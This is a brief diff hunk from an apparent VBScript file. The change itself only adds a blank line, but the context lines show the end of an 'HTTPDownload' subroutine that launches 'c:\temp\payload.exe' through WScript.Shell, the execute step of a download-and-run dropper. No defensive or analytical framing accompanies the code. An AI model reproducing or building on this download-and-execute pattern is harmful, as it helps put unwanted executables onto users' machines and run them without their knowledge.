@@ -53,3 +53,4 @@ Sub HTTPDownload( myURL, myPath )
   Set WshShell = WScript.CreateObject("WScript.Shell")
   WshShell.Run "c:\temp\payload.exe"
 End Sub
+
